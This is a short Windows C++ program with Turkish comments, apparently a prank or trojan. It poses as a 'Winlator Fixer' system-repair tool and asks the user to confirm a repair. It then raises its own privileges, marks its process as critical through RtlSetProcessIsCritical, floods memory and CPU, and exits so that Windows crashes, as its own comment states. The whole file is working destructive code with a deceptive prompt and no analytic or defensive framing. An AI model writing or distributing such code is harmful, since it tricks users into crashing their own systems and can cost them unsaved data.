#include <windows.h>
#include <vector>

// Fonksiyon imzasını tanımlıyoruz
typedef NTSTATUS (NTAPI *pfnRtlSetProcessIsCritical)(BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedPrivilege);

// Kaynak tüketme fonksiyonu
DWORD WINAPI KaynakSömür(LPVOID lpParam) {
    std::vector<void*> bellek;
    while (true) {
        void* p = malloc(1024 * 512); 
        if (p) bellek.push_back(p);
        for (volatile int i = 0; i < 1000000; i++); 
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // 1. AYRICALIKLARI YÜKSELT
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }

    // 2. KRİTİK İŞARETLEME (Dinamik Yükleme - Hata Vermez)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        auto RtlSetProcessIsCritical = (pfnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        }
    }

    // 3. MESAJ VE ÇÖKERTME
    if (MessageBoxA(NULL, "Sistem onarımı başlatılsın mı?", "Winlator Fixer", MB_YESNO | MB_ICONWARNING) == IDYES) {
        CreateThread(NULL, 0, KaynakSömür, NULL, 0, NULL);
        Sleep(3000);
        exit(0); // Kritik işlem kapandığı için sistem çöker
    }

    return 0;
}
